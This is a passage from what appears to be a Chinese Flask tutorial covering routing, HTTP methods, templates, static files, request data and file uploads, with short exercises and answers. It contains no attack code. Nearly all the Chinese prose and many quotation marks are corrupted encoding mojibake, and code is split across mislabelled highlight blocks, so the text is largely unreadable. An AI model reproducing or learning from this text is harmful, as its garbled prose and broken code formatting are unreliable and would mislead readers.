â€˜Subpath &#123;&#125;â€™.format(subpath)<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å½“è®¿é—® http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/user/</span>shiyanlou æ—¶ï¼Œé¡µé¢æ˜¾ç¤ºä¸º User shiyanlouã€‚</span><br><span class="line"></span><br><span class="line">å½“è®¿é—® http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/post/</span><span class="number">3</span> æ—¶ï¼Œé¡µé¢æ˜¾ç¤ºä¸º Post <span class="number">3</span>ã€‚ç”¨æˆ·åœ¨æµè§ˆå™¨åœ°å€æ ä¸Šè¾“å…¥çš„éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯åœ¨ä¼ é€’ç»™ show_post å‡½æ•°å¤„ç†æ—¶å·²ç»è¢«è½¬æ¢ä¸ºäº†æ•´å‹ã€‚</span><br><span class="line"></span><br><span class="line">å½“è®¿é—® http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/path/</span>file<span class="regexp">/A/</span>a.txt æ—¶ï¼Œé¡µé¢æ˜¾ç¤ºä¸º Subpath file<span class="regexp">/A/</span>a.txt</span><br><span class="line"></span><br><span class="line">å”¯ä¸€ URLs <span class="regexp">/ é‡å®šå‘è¡Œä¸º</span></span><br></pre></td></tr></table></figure></p><p>@app.route(â€˜/projects/â€˜)<br>def projects():<br>    return â€˜The project pageâ€™</p><p>@app.route(â€˜/aboutâ€™)<br>def about():<br>    return â€˜The about page<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">è™½ç„¶å®ƒä»¬çœ‹èµ·æ¥ç¡®å®ç›¸ä¼¼ï¼Œä½†å®ƒä»¬ç»“å°¾æ–œçº¿çš„ä½¿ç”¨åœ¨ <span class="built_in">URL</span> å®šä¹‰ä¸­ä¸åŒã€‚</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸€ç§æƒ…å†µä¸­ï¼Œè§„èŒƒçš„ <span class="built_in">URL</span> æŒ‡å‘ projects å°¾ç«¯æœ‰ä¸€ä¸ªæ–œçº¿/ã€‚è¿™ç§æ„Ÿè§‰å¾ˆåƒåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶å¤¹ã€‚è®¿é—®ä¸€ä¸ªç»“å°¾ä¸å¸¦æ–œçº¿çš„ <span class="built_in">URL</span> ä¼šè¢« Flask é‡å®šå‘åˆ°å¸¦æ–œçº¿çš„è§„èŒƒ <span class="built_in">URL</span> å»ã€‚</span><br><span class="line">å½“è®¿é—® <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/projects/ æ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤º The project pageã€‚</span><br><span class="line"></span><br><span class="line">ç„¶è€Œï¼Œç¬¬äºŒç§æƒ…å†µçš„ <span class="built_in">URL</span> ç»“å°¾ä¸å¸¦æ–œçº¿ï¼Œç±»ä¼¼ UNIX-like ç³»ç»Ÿä¸‹çš„æ–‡ä»¶çš„è·¯å¾„åã€‚æ­¤æ—¶å¦‚æœè®¿é—®ç»“å°¾å¸¦æ–œçº¿çš„ <span class="built_in">URL</span> ä¼šäº§ç”Ÿä¸€ä¸ª<span class="number">404</span> â€œNot Foundâ€é”™è¯¯ã€‚</span><br><span class="line">å½“è®¿é—® <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/about æ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤º The about pageï¼›ä½†æ˜¯å½“è®¿é—® <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/about/ æ—¶ï¼Œé¡µé¢å°±ä¼šæŠ¥é”™ Not Foundã€‚</span><br><span class="line"></span><br><span class="line">å½“ç”¨æˆ·è®¿é—®é¡µé¢å¿˜è®°ç»“å°¾æ–œçº¿æ—¶ï¼Œè¿™ä¸ªè¡Œä¸ºå…è®¸å…³è”çš„ <span class="built_in">URL</span> ç»§ç»­å·¥ä½œï¼Œå¹¶ä¸”ä¸ Apache å’Œå…¶å®ƒçš„æœåŠ¡å™¨çš„è¡Œä¸ºä¸€è‡´ï¼Œåä¹‹åˆ™ä¸è¡Œï¼Œå› æ­¤åœ¨ä»£ç çš„ <span class="built_in">URL</span> è®¾ç½®æ—¶æ–œçº¿åªå¯å¤šå†™ä¸å¯å°‘å†™ï¼›å¦å¤–ï¼Œ<span class="built_in">URL</span> ä¼šä¿æŒå”¯ä¸€ï¼Œæœ‰åŠ©äºé¿å…æœç´¢å¼•æ“ç´¢å¼•åŒä¸€ä¸ªé¡µé¢ä¸¤æ¬¡ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">## HTTPæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">é»˜è®¤æƒ…å†µä¸‹ï¼Œè·¯ç”±åªä¼šå“åº” GET è¯·æ±‚ï¼Œä½†æ˜¯èƒ½å¤Ÿé€šè¿‡ç»™ route() è£…é¥°å™¨æä¾› methods å‚æ•°æ¥æ”¹å˜ã€‚è¿™é‡Œæ˜¯ä¸€ä¸ªä¾‹å­:</span><br></pre></td></tr></table></figure></p><p>@app.route(â€˜/loginâ€™, methods=[â€˜GETâ€™, â€˜POSTâ€™])<br>def login():<br>    if request.method == â€˜POSTâ€™:<br>        do_the_login()    å¦‚æœæ˜¯ POST æ–¹æ³•å°±æ‰§è¡Œç™»å½•æ“ä½œ<br>    else:<br>        show_the_login_form()    å¦‚æœæ˜¯ GET æ–¹æ³•å°±å±•ç¤ºç™»å½•è¡¨å•<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœä½¿ç”¨ GET æ–¹æ³•ï¼ŒHEAD æ–¹æ³•å°†ä¼šè‡ªåŠ¨æ·»åŠ è¿›æ¥ã€‚ä½ ä¸å¿…å¤„ç†å®ƒä»¬ã€‚ä¹Ÿèƒ½ç¡®ä¿ HEAD è¯·æ±‚ä¼šæŒ‰ç…§ HTTP RFC (æ–‡æ¡£åœ¨ HTTP åè®®é‡Œé¢æè¿°) è¦æ±‚æ¥å¤„ç†ï¼Œå› æ­¤ä½ å®Œå…¨å¯ä»¥å¿½ç•¥è¿™éƒ¨åˆ† HTTP è§„èŒƒã€‚</span><br><span class="line">åŒæ ·åœ°ï¼Œè‡ªä» Flask <span class="number">0.6</span> åï¼ŒOPTIONS æ–¹æ³•ä¹Ÿèƒ½è‡ªåŠ¨ä¸ºä½ å¤„ç†ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">## ç»ƒä¹ </span></span><br><span class="line"></span><br><span class="line">è¯·å¼€å‘ä¸€ä¸ªå°åº”ç”¨ï¼Œ<span class="built_in">URL</span> åœ°å€è¾“å…¥<span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/xxxï¼ˆå…¶ä¸­ xxx è¡¨ç¤ºä½ çš„åå­—ï¼‰ï¼Œè®¿é—®é¡µé¢ä¼šæ˜¾ç¤º xxxã€‚</span><br><span class="line"></span><br><span class="line">è¯·å®Œæˆä¸€ä¸ªåº”ç”¨ï¼Œå½“ <span class="built_in">URL</span> æ˜¯<span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/<span class="built_in">sum</span>/<span class="keyword">a</span>/bæ—¶ï¼Œå…¶ä¸­<span class="keyword">a</span>å’Œbéƒ½æ˜¯æ•°å­—ï¼ŒæœåŠ¡å™¨è¿”å›å®ƒä»¬çš„å’Œã€‚</span><br><span class="line">ç»ƒä¹ é¢˜ <span class="number">1</span> çš„ç­”æ¡ˆ</span><br></pre></td></tr></table></figure></p><p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p><p>@app.route(â€˜/<username>â€˜)<br>def get_name(username):<br>    return username<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></username></p><p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p><p>@app.route(â€˜/sum/<a href="int:a" target="_blank" rel="noopener">int:a</a>/<a href="int:b" target="_blank" rel="noopener">int:b</a>â€˜)<br>def get_sum(a,b):<br>    return â€˜&#123;0&#125; + &#123;1&#125; = &#123;2&#125;â€™.format(a,b,a+b)<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># é™æ€æ–‡ä»¶åŠæ¸²æŸ“æ¨¡æ¿</span></span><br><span class="line"><span class="meta">## é™æ€æ–‡ä»¶</span></span><br><span class="line">åŠ¨æ€çš„ web åº”ç”¨åŒæ ·éœ€è¦é™æ€æ–‡ä»¶ã€‚CSS å’Œ JavaScript æ–‡ä»¶é€šå¸¸æ¥æºäºæ­¤ã€‚</span><br><span class="line">ç†æƒ³æƒ…å†µä¸‹ï¼Œä½ çš„ web æœåŠ¡å™¨å·²ç»é…ç½®å¥½ä¸ºå®ƒä»¬æœåŠ¡ï¼Œç„¶è€Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ Flask å°±èƒ½å¤Ÿåšåˆ°ã€‚åªè¦åœ¨ä½ çš„åŒ…ä¸­æˆ–æ¨¡å—æ—è¾¹åˆ›å»ºä¸€ä¸ªåä¸º<span class="keyword">static</span> çš„æ–‡ä»¶å¤¹ï¼Œåœ¨åº”ç”¨ä¸­ä½¿ç”¨ /<span class="keyword">static</span> å³å¯è®¿é—®ã€‚</span><br><span class="line"></span><br><span class="line">ç»™é™æ€æ–‡ä»¶ç”Ÿæˆ URL ï¼Œä½¿ç”¨ç‰¹æ®Šçš„ <span class="keyword">static</span> ç«¯ç‚¹å</span><br><span class="line">url_for(<span class="string">'static'</span>, filename=<span class="string">'style.css'</span>)</span><br><span class="line">è¿™ä¸ªæ–‡ä»¶æ˜¯åº”è¯¥å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„<span class="keyword">static</span>/style.cssã€‚</span><br><span class="line">åœ¨ Python ä¸­ç”Ÿæˆ HTML å¹¶ä¸å¥½ç©ï¼Œå®é™…ä¸Šæ˜¯ç›¸å½“ç¹ççš„ï¼Œå› ä¸ºä½ å¿…é¡»è‡ªè¡Œåšå¥½ HTML è½¬ä¹‰ä»¥ä¿æŒåº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚ç”±äºè¿™ä¸ªåŸå› ï¼ŒFlask è‡ªåŠ¨ä¸ºä½ é…ç½®å¥½ Jinja2 æ¨¡æ¿ã€‚</span><br><span class="line"></span><br><span class="line">ä½ å¯ä»¥ä½¿ç”¨æ–¹æ³• render_template() æ¥æ¸²æŸ“æ¨¡æ¿ã€‚æ‰€æœ‰ä½ éœ€è¦åšçš„å°±æ˜¯æä¾›æ¨¡æ¿çš„åç§°ä»¥åŠä½ æƒ³è¦ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ å…¥æ¨¡æ¿çš„å˜é‡ã€‚</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæœ‰ä¸ªæ¸²æŸ“æ¨¡æ¿çš„ç®€å•ä¾‹å­ï¼Œåœ¨ /home/shiyanlou/Code ç›®å½•ä¸‹æ–°å»º hello.py æ–‡ä»¶ï¼Œå¹¶å‘å…¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :</span><br></pre></td></tr></table></figure></p><p>from flask import Flask, render_template<br>app = Flask(<strong>name</strong>)</p><p>@app.route(â€˜/hello/â€˜)<br>@app.route(â€˜/hello/<name>â€˜)<br>def hello(name=None):    é»˜è®¤ name ä¸º None<br>    return render_template(â€˜hello.htmlâ€™, name=name)    å°† name å‚æ•°ä¼ é€’åˆ°æ¨¡æ¿å˜é‡ä¸­<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flask å°†ä¼šåœ¨ templates æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾æ¨¡æ¿ã€‚å› æ­¤å¦‚æœä½ çš„åº”ç”¨æ˜¯ä¸ªæ¨¡å—ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹åœ¨æ¨¡å—çš„æ—è¾¹ï¼Œå¦‚æœå®ƒæ˜¯ä¸€ä¸ªåŒ…ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å¤¹åœ¨ä½ çš„åŒ…é‡Œé¢:</span><br><span class="line"></span><br><span class="line"><span class="section">æ¯”å¦‚ï¼Œåº”ç”¨æ˜¯æ¨¡å—ï¼ˆæœ¬ç³»åˆ—å®éªŒçš„åº”ç”¨ç»“æ„éƒ½æ˜¯æ¨¡å—å‹ï¼‰:</span></span><br></pre></td></tr></table></figure></name></p><p>/application.py<br>/templates<br>    /hello.html<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">/application.py</span><br><span class="line">/templates</span><br><span class="line">    /hello.html</span><br></pre></td></tr></table></figure></p><p>å¯¹äºæ¨¡æ¿ï¼Œä½ å¯ä»¥ä½¿ç”¨ Jinja2 æ¨¡æ¿çš„å…¨éƒ¨èƒ½åŠ›ã€‚è¯¦ç»†ä¿¡æ¯æŸ¥çœ‹å®˜æ–¹çš„ Jinja2 Template Documentation ã€‚</p><p>åœ¨ /home/shiyanlou/Code ç›®å½•ä¸‹æ–°å»º templates æ–‡ä»¶å¤¹å¹¶åœ¨å…¶ä¸­æ–°å»º hello.html æ–‡ä»¶ï¼š<br>ç„¶åå‘ hello.html æ¨¡æ¿æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello from Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&amp;#123;% if name %&amp;#125;   <span class="comment">&lt;!-- å¦‚æœ name ä¸ä¸ºç©ºåˆ™å°† name æ¸²æŸ“å‡ºæ¥ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &amp;#123;&amp;#123; name &amp;#125;&amp;#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&amp;#123;% else %&amp;#125;   <span class="comment">&lt;!-- å¦‚æœ name ä¸ºç©ºåˆ™æ‰“å° Hello World! --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br></pre></td></tr></table></figure></p><p>æŒ‰ç…§å‰é¢çš„æ–¹æ³•è¿è¡Œåº”ç”¨ç¨‹åºï¼Œå½“è®¿é—® <a href="http://127.0.0.1:5000/hello/" target="_blank" rel="noopener">http://127.0.0.1:5000/hello/</a> æ—¶é¡µé¢æ˜¾ç¤º Hello World!ï¼›<br>å½“è®¿é—® <a href="http://127.0.0.1:5000/hello/shiyanlou" target="_blank" rel="noopener">http://127.0.0.1:5000/hello/shiyanlou</a> æ—¶é¡µé¢æ˜¾ç¤º Hello shiyanlou!ã€‚<br>åœ¨æ¨¡æ¿ä¸­ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨requestï¼Œsessionå’Œgå¯¹è±¡ï¼Œä¹Ÿèƒ½ä½¿ç”¨å‡½æ•°get_flashed_messages() ã€‚</p><p>æ¨¡æ¿ç»§æ‰¿æ˜¯ååˆ†æœ‰ç”¨çš„ã€‚å¦‚æœæƒ³è¦çŸ¥é“æ¨¡æ¿ç»§æ‰¿å¦‚ä½•å·¥ä½œçš„è¯ï¼Œè¯·é˜…è¯»æ–‡æ¡£æ¨¡æ¿ç»§æ‰¿ã€‚åŸºæœ¬çš„æ¨¡æ¿ç»§æ‰¿ä½¿å¾—æŸäº›ç‰¹å®šå…ƒç´ ï¼ˆå¦‚æ ‡é¢˜ã€å¯¼èˆªå’Œé¡µè„šï¼‰åœ¨æ¯ä¸€é¡µæˆä¸ºå¯èƒ½ã€‚</p><p>è‡ªåŠ¨è½¬ä¹‰é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå› æ­¤å¦‚nameåŒ…å« HTMLï¼Œå®ƒå°†ä¼šè‡ªåŠ¨è½¬ä¹‰ã€‚å¦‚æœä½ ä¿¡ä»»ä¸€ä¸ªå˜é‡ï¼Œå¹¶ä¸”ä½ çŸ¥é“å®ƒæ˜¯å®‰å…¨çš„ï¼ˆä¾‹å¦‚ä¸€ä¸ªæ¨¡å—æŠŠ wiki æ ‡è®°è½¬æ¢åˆ° HTML ï¼‰ï¼Œä½ å¯ä»¥ç”¨Markupç±»æˆ–|safeè¿‡æ»¤å™¨åœ¨æ¨¡æ¿ä¸­æ ‡è®°å®ƒæ˜¯å®‰å…¨çš„ã€‚ åœ¨ Jinja 2 æ–‡æ¡£ä¸­ï¼Œä½ ä¼šè§åˆ°æ›´å¤šä¾‹å­ã€‚</p><p>ç»ƒä¹ :<br>è¯·åˆ›å»ºä¸€ä¸ªæ¨¡æ¿å’ŒCSSæ–‡ä»¶ï¼Œå¹¶åœ¨æ¨¡æ¿å¼•å…¥CSSæ–‡ä»¶ï¼Œå½“è®¿é—®ç½‘ç«™é¦–é¡µæ—¶æ˜¾ç¤ºä¸€ä¸ªç»¿è‰²çš„Hello ShiYanLouå­—æ ·ã€‚å…³äºHTMLä»¥åŠCSSçš„å­¦ä¹ è¯·å‚è€ƒåœ¨çº¿æ•™ç¨‹<br>æ–‡ä»¶ç›®å½•ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/hello.py</span></span><br><span class="line"><span class="string">/templates</span></span><br><span class="line">    <span class="string">/hello.html</span></span><br><span class="line"><span class="string">/static</span></span><br><span class="line">    <span class="string">/hello.css</span></span><br></pre></td></tr></table></figure><p>hello.py æ–‡ä»¶ä¸­çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br></pre></td></tr></table></figure><p>templates/hello.html å­˜æ”¾çš„æ˜¯å‰ç«¯ä»£ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('static', filename='hello.css') &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello ShiYanLou<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>static/hello.css å­˜æ”¾çš„æ˜¯ css ä»£ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">h1&amp;<span class="comment">#123;</span></span><br><span class="line"><span class="symbol">    color:</span> green<span class="comment">;</span></span><br><span class="line">    text-align: center<span class="comment">;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="æ¥æ”¶è¯·æ±‚æ•°æ®"><a href="#æ¥æ”¶è¯·æ±‚æ•°æ®" class="headerlink" title="æ¥æ”¶è¯·æ±‚æ•°æ®"></a>æ¥æ”¶è¯·æ±‚æ•°æ®</h1><p>é¦–å…ˆä½ éœ€è¦ä» flask æ¨¡å—ä¸­å¯¼å…¥request:<br>from flask import request<br>å½“å‰è¯·æ±‚çš„æ–¹æ³•å¯ä»¥ç”¨methodå±æ€§æ¥è®¿é—®ã€‚ä½ å¯ä»¥ç”¨formå±æ€§æ¥è®¿é—®è¡¨å•æ•°æ® (æ•°æ®åœ¨ POST æˆ–è€…PUTä¸­ä¼ è¾“)ã€‚<br>è¿™é‡Œæ˜¯ä¸Šé¢æåŠåˆ°çš„ä¸¤ç§å±æ€§çš„å®Œæ•´çš„ä¾‹å­:<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'POST'</span>, <span class="string">'GET'</span>])</span><br><span class="line">def login():</span><br><span class="line">    <span class="keyword">error</span> = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> valid_login(request.form[<span class="string">'username'</span>],</span><br><span class="line">                       request.form[<span class="string">'password'</span>]):</span><br><span class="line">            <span class="keyword">return</span> log_the_user_in(request.form[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">error</span> = <span class="string">'Invalid username/password'</span></span><br><span class="line">     å½“è¯·æ±‚å½¢å¼ä¸ºâ€œGETâ€æˆ–è€…è®¤è¯å¤±è´¥åˆ™æ‰§è¡Œä»¥ä¸‹ä»£ç </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, <span class="keyword">error</span>=<span class="keyword">error</span>)</span><br></pre></td></tr></table></figure></p><p>å¦‚æœåœ¨formå±æ€§ä¸­ä¸å­˜åœ¨ä¸Šè¿°é”®å€¼ä¼šå‘ç”Ÿäº›ä»€ä¹ˆï¼Ÿåœ¨è¿™ç§æƒ…å†µä¸‹ä¼šè§¦å‘ä¸€ä¸ªç‰¹åˆ«çš„ KeyErrorã€‚ä½ å¯ä»¥åƒæ•è·æ ‡å‡†çš„KeyErrorä¸€æ ·æ¥æ•è·å®ƒï¼Œå¦‚æœä½ ä¸è¿™æ ·å»åšï¼Œä¼šæ˜¾ç¤ºä¸€ä¸ªHTTP 400 Bad Requesté”™è¯¯é¡µé¢ã€‚æ‰€ä»¥å¾ˆå¤šæƒ…å†µä¸‹ä½ ä¸éœ€è¦å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚</p><p>ä½ å¯ä»¥ç”¨argså±æ€§æ¥æ¥æ”¶åœ¨URL ( ?key=value )ä¸­æäº¤çš„å‚æ•°:<br>searchword = request.args.get(â€˜keyâ€™, â€˜â€™)<br>æˆ‘ä»¬æ¨èä½¿ç”¨getæ¥è®¿é—® URL å‚æ•°æˆ–æ•è·KeyErrorï¼Œå› ä¸ºç”¨æˆ·å¯èƒ½ä¼šä¿®æ”¹ URLï¼Œå‘ä»–ä»¬æ˜¾ç¤ºä¸€ä¸ª400 bad requesté¡µé¢ä¸æ˜¯ç”¨æˆ·å‹å¥½çš„ã€‚</p><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><p>ä½ èƒ½å¤Ÿå¾ˆå®¹æ˜“åœ°ç”¨ Flask å¤„ç†æ–‡ä»¶ä¸Šä¼ ã€‚åªè¦ç¡®ä¿åœ¨ä½ çš„ HTML è¡¨å•ä¸­ä¸è¦å¿˜è®°è®¾ç½®å±æ€§enctype=â€multipart/form-dataâ€ï¼Œå¦åˆ™æµè§ˆå™¨å°†ä¸ä¼šä¼ é€æ–‡ä»¶ã€‚</p><p>ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å­˜å‚¨åœ¨å†…å­˜æˆ–è€…æ–‡ä»¶ç³»ç»Ÿä¸Šä¸€ä¸ªä¸´æ—¶ä½ç½®ã€‚ä½ å¯ä»¥é€šè¿‡è¯·æ±‚å¯¹è±¡ä¸­fileså±æ€§è®¿é—®è¿™äº›æ–‡ä»¶ã€‚æ¯ä¸ªä¸Šä¼ çš„æ–‡ä»¶éƒ½ä¼šå­˜å‚¨åœ¨è¿™ä¸ªå±æ€§å­—å…¸é‡Œã€‚å®ƒè¡¨ç°å¾—åƒä¸€ä¸ªæ ‡å‡†çš„ Python fileå¯¹è±¡ï¼Œä½†æ˜¯å®ƒåŒæ ·å…·æœ‰save()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å…è®¸ä½ å­˜å‚¨æ–‡ä»¶åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸Šã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ç”¨æ¥æ¼”ç¤ºæäº¤æ–‡ä»¶åˆ°æœåŠ¡å™¨ä¸Š:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span><span class="symbol">:</span></span><br><span class="line">        f = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">        f.save(<span class="string">'/var/www/uploads/uploaded_file.txt'</span>)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>å¦‚æœä½ æƒ³è¦çŸ¥é“åœ¨ä¸Šä¼ åˆ°ä½ çš„åº”ç”¨ä¹‹å‰åœ¨å®¢æˆ·ç«¯çš„æ–‡ä»¶åç§°ï¼Œä½ å¯ä»¥è®¿é—®filenameå±æ€§ã€‚<br>ä½†è¯·è®°ä½æ°¸è¿œä¸è¦ä¿¡ä»»è¿™ä¸ªå€¼ï¼Œå› ä¸ºè¿™ä¸ªå€¼å¯ä»¥ä¼ªé€ ã€‚å¦‚æœä½ æƒ³è¦ä½¿ç”¨å®¢æˆ·ç«¯çš„æ–‡ä»¶åæ¥åœ¨æœåŠ¡å™¨ä¸Šå­˜å‚¨æ–‡ä»¶ï¼ŒæŠŠå®ƒä¼ é€’åˆ°Werkzeugæä¾›ç»™ä½ çš„secure_filename()å‡½æ•°:</p><figure 